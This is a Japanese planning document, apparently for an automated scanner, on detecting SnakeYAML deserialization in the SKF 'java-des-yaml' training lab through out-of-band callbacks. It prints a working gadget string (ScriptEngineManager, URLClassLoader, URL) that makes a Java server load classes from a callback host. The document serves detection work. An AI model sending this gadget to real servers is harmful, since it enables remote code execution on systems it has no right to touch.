---
task_id: SGK-2026-0498
doc_type: plan
status: done
parent_task_id: SGK-2026-0442
related_docs:
- docs/shigoku/specs/2026-09-01_sgk-2026-0465_detection-capability-map.md
- docs/shigoku/reports/2026-09-14_sgk-2026-0498_java-snakeyaml-oob-deserialization_work_report.md
- docs/shigoku/worklogs/2026-09-14_sgk-2026-0498_java-snakeyaml-oob-deserialization_work_log.md
- docs/shigoku/plans/done/2026-09-14_sgk-2026-0496_oob-deserialization.md
tags:
- shigoku
- detection
- deserialization
- java
- oob
- confirmation-bar
created_at: '2026-09-14'
updated_at: '2026-09-14'
---

# SGK-2026-0498 計画 — Java(SnakeYAML) OOB デシリアライズ(RCE級)を実対象で本物確定（◎）

## 背景・事実（偵察で実測）

SGK-2026-0496 で Python pickle の OOB デシリアライズを ◎ 化済み。本タスクは同基盤を **Java** へ横展開する。
実対象：**SKF `java-des-yaml`**（Spring Boot・`GET /config/{base64}` が base64 デコード後の YAML を
`new Yaml().load()`＝SnakeYAML 1.25・JDK 8u212・port 5000）。SnakeYAML の型解決は任意 Java 型を構築でき、
`!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["<callback>/"]]]]` を渡すと
JDK の ServiceLoader が URLClassLoader のベース URL に `META-INF/services/javax.script.ScriptEngineFactory`
を付けて**外向き HTTP 取得**する（in-band では 500・空＝ブラインド）。

### 実測で確定した障害と原因（重要）

当初コールバックが受信器（LocalOOBListener :13337）に届かず「Java は不通」と誤認した。切り分けの結果、
JVM は 13337 に直接到達可能（`jrunscript`/`URL.openConnection` で 200・受信ログ確認）で、真因は**我々の
リスナーのルーティング**だった。`LocalOOBListener` のルートは `/callback/{token}` と `/{token}` の**単一
セグメント**のみで、ServiceLoader が付ける多段パス `/callback/<token>/META-INF/services/...` に aiohttp が
一致せず 404＝token 配下に記録されなかった。これは我々のバグであり JVM の制約ではない。

## 対象（完了契約）

SKF `java-des-yaml` を実対象で **機械フロア＋実再現＋実 poc_judge の完全3ゲート**で ◎。確定は**OOB
コールバック**（一意 token を含む多段パスへ標的の JVM が外向き取得）。汎用マーカー
`oob_interaction_received` を再利用（**payout_grade は無改変**）。

## 実装方針（非凍結中心＋承認済み凍結1）

1. **`utils/oob_listener.py`（非凍結）**: 多段パスを token 配下に記録する tail ルートを additive 追加
   （`/callback/{token}/{tail:.*}`・`/{token}/{tail:.*}`。`{tail:.*}` は '/' を含めて一致。`/callback/` 付きを
   先に登録して `/{token}/{tail}` の token='callback' 誤取得を防止）。
2. **`detection/oob_payload_builders.py`（非凍結）**: builder `java_snakeyaml` を追加（ScriptEngineManager/
   URLClassLoader/URL ガジェットの YAML テキストを bytes 返し・callback は末尾 '/' でベース URL 化）。
3. **`agents/swarm/injection/smart_blind_deser.py`（非凍結）**: `path` モード（base64 を URL パス末尾に付けて
   GET）＋ GET 送信＋モード/kind 別の正確な PoC（プレースホルダでなく**実 base64 URL**）を追加。
4. **`detection/oob_provider.py`（非凍結）**: `poll` の戻りに同一 token の**全インバウンド行**を additive
   追加（Java は META-INF 取得→返したクラス名取得と複数回叩くため生受信ログを PoC に載せる）。
5. **`validation/sealed_reproduction_checker.py`（凍結・承認）**: `_check_oob_replay` に `path`(GET) モードを
   additive 追加（builder=java_snakeyaml＋base64 を URL パス末尾に付けて GET・fresh callback で作り直し）。

## poc_judge 対策（[[poc-judge-raw-evidence]]）

初回 poc_judge は false（プレースホルダ `<gadget>`・生受信ログ不足）。**実 base64 ペイロード込みの完全 URL**、
**全インバウンド行**、**User-Agent: Java/1.8.0_212**（＝標的 JVM 由来の決定的証拠）、返したクラス名の
`…/OK.class` 取得（ServiceLoader が攻撃者指定クラスを読もうとする RCE 級シグネチャ）を PoC に含めて再送 → 承認。

## 完了条件

1. 実 SKF `java-des-yaml` で実 `SmartOOBDeserHunter.execute`（path/java_snakeyaml/base64）が OOB で自走検出→
   payout_grade=True/oob_interaction_received。
2. 実 `SealedReproductionChecker` が新 token で再送し JVM コールバック再観測→matched→CONFIRMED。
3. 本物の poc_judge（実 LLM）で is_real=True・has_actual_impact=True・counter_evidence=False。
4. 製品非依存 fixture の新規テスト緑（builder・engine path モード・sealed path モード）。
5. 凍結3（poc_judge.md／task_queue.py／finding_validator.py）exit 0。製品トークン 0・秘密値非露出・回帰ゼロ。

## NOT in scope

- PHP のオブジェクト注入（unserialize）: 制御可能なラボが無く POP チェーンはアプリ固有＝汎用実装不可（別途）。
- SnakeYAML 以外の Java ガジェット（ysoserial 系ネイティブ Java シリアライズ・JNDI/LDAP・DNS-only OOB）。
- 実インターネット標的向けの自前ホスト interactsh（DNS+HTTP）差し込み（別タスク）。

## 参考にしたルール

CLAUDE.md §14/§15/§16/§17/§19、`rules/lessons.md`、`rules/codingrules.md`、メモリ
[[no-capability-minimization]]・[[poc-judge-raw-evidence]]・[[detection-capability-wiring-map]]・
[[skf-labs-ssti-crlf]]。
